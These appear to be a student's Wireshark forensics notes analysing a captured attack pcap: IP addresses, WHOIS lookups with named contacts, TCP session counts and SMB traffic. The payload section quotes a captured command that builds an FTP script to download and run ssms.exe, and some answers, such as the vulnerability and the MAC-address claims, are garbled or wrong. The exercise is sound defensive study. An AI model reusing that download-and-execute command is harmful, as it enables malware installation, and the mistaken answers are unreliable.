our second task is to analyse a suspicious piece of network traffic captured in the following .pcap file. To visualize it you should use Wireshark, a network protocol analyzer, and answer the questions below to discover what suspicious activity lie within.
WireShark is a network packet analizer.


    Which systems (i.e. IP addresses) are involved?
    -> statistics -> IPv4 statistics -> source and destination adresses
98.114.205.102 | cisco | windows 2000
192.150.11.111 |supermic | windows 5.1

    What can you find out about the attacking host (e.g., where is it located)?
attacking host : 98.114.205.102 
because he's initiating the conversations (3-way handshake)
 check ip adress information @ p.e. www.who.is
geolocalisation ipinfo.io
Philadeplhia, Pennsylvania, U.S.A


 OrgName:       Verizon Business
OrgId:          MCICS
Address:        22001 Loudoun County Pkwy
City:           Ashburn
StateProv:      VA
PostalCode:     20147
Country:        US

OrgTechHandle: SWIPP9-ARIN
OrgTechName:   SWIPPER
OrgTechPhone:  +1-800-900-0241
OrgTechEmail:  stephen.r.middleton@verizon.com
OrgTechRef:    https://rdap.arin.net/registry/entity/SWIPP9-ARIN

OrgRoutingHandle: JEYAK-ARIN
OrgRoutingName:   Jeyakumar, Jebaraj
OrgRoutingPhone:  +1-919-378-7285
OrgRoutingEmail:  jebaraj.kennet@verizon.com
OrgRoutingRef:    https://rdap.arin.net/registry/entity/JEYAK-ARI

    How many TCP sessions are contained in the dump file?

    right-mouse click
    tcp stream

    
    5

    enter in filter tcp.flags.syn==1 or (tcp.flags.syn==1 and tcp.flags.ack==1)
    -> statistics -> conversations -> limit to display filter

    How long did it take to perform the attack?
view option for time -> time view display format
or
statistics -> capture file properties

= 16 seconds

    Which operating system was targeted by the attack? And which service? Which vulnerability?
    looking for the TTL (time to live)
192.150.11.111 | windows 5.1 | adobe - trough phonecall

    Can you sketch an overview of the general actions performed by the attacker? 
    tcp stream 
    
    Which are the protocols involved? What can you tell about the payload?
    SMB-protocol
    echo open 0.0.0.0 8884 > o&echo user 1 1 >> o &echo get ssms.exe >> o &echo quit >> o &ftp -n -s:o &del /F /Q o &ssms.exe
ssms.exe

payload = initiates the attack - what needs to be sent in order to attack the victim

SMB = The Server Message Block (SMB) protocol is a network file sharing protocol that allows applications on a computer to read and write to files and to request services from server programs in a computer network. The SMB protocol can be used on top of its TCP/IP protocol or other network protocols.

The SMB protocol enables applications and their users to access files on remote servers, as well as connect to other resources, including printers, mailslots and named pipes. SMB provides client applications with a secure and controlled method for opening, reading, moving, creating and updating files on remote servers.

The IP address of a device mainly helps in identifying the connection of a network (using which the device is connecting to the network). The MAC Address, on the other hand, ensures the computer device's physical location. It helps us to identify a given device on the available network uniquely.

What can a MAC address tell you?
The MAC address (short for media access control address) is the worldwide unique hardware address of a single network adapter. The physical address is used to identify a device in computer networks. Since MAC addresses are assigned directly by the hardware manufacturer, they are also referred to as hardware addresses.

Wireshark is a free and open-source packet analyzer. It is used for network troubleshooting, analysis, software, and communications protocol development. 

Wireshark has quite an extensive application or use. Here are a few examples of what people use Wireshark for:

    Network administrators use it to troubleshoot network problems
    Network security engineers use it to examine security problems
    Developers use it to debug protocol implementations
    Others use it to learn network protocol internals